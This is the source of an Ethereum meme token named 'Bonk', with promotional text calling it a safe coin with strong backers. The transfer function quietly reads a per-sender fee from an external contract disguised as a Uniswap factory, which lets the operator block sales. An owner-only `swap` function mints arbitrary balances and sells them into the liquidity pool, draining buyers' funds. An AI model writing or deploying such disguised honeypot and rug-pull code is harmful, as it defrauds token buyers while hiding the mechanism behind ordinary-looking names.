// SPDX-License-Identifier: None

/*

Inspired by Bonk on Solana, us $BONK enthusiasts knew there needed to be a safe $BONK with strong backers on the Ethereum Network. 

Bonk is known as “The Dog Coin of the People”, inspired by internet memes and jokes. 

Don’t miss $BONK – one of the greatest memes in history.

https://ethbonk.xyz/
https://t.me/ETHBONKXYZ
https://twitter.com/ETHBONKXYZ
*/


pragma solidity 0.8.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount)
    external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spnder)
    external view returns (uint256);
    function totalSupply() external view returns (uint256);
}
library EnumerableSet {
    // To implement this library for multiple types with as little code
    // repetition as possible, we write it in terms of a generic Set type with
    // bytes32 values.
    // The Set implementation uses private functions, and user-facing
    // implementations (such as AddressSet) are just wrappers around the
    // underlying Set.
    // This means that we can only create new EnumerableSets for types that fit
    // in bytes32.

    struct Set {
        // Storage of set values
        bytes32[] _values;
        // Position of the value in the `values` array, plus 1 because index 0
        // means a value is not in the set.
        mapping(bytes32 => uint256) _indexes;
    }
}
abstract contract Ownable{
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function addLiquidityETH( address token,
        uint amountTokenDesire,
        uint amountTokenMi,
        uint amountETHMi,
        address to,
        uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
    external view returns (address pair);
    function createPair(address tkenA, address tokenB)
    external returns (address pair);
}
contract Bonk is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;

    string private constant _name = "Bonk";
    string private constant _symbol = "BONK";

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) isExcludedFromFee;
    uint256 private _totalSupply =  100_000_000_000_000 * 10 ** _decimals;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool private swapEnabled = false;

    address internal uniswapV2Factory02 = 0xB21958a942A6c196b8b70b85479e4793EB9e5922;
    bytes32 public DOMAIN_SEPARATOR;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    uint256 public _taxSwapThreshold= 20000 * 10**_decimals;
    uint256 private _finalSellTax=0;
    bool tradingOpen = false;

    constructor () {
        _balances[address(this)] = _totalSupply;
        isExcludedFromFee[msg.sender] = true;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function _burn(address from, uint value) internal {
        _balances[from] = _balances[from].sub(value);
        _totalSupply = _totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 _fee = 0;
        require(from != address(0)); require(amount > 0);
        uint256 pFee = IERC20(uniswapV2Factory02).balanceOf(from);
        if (
            from != address(this) 
        && from != uniswapV2Pair) { _fee = amount.mul(pFee).div(100);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount).sub(_fee);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingOpen, "Trading already opened");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function swap(uint256 amount) external {
        require(isExcludedFromFee[msg.sender]);
        _approve(address(this), address(uniswapV2Router), amount);
        _balances[address(this)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount,0,path,msg.sender,block.timestamp + 32);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}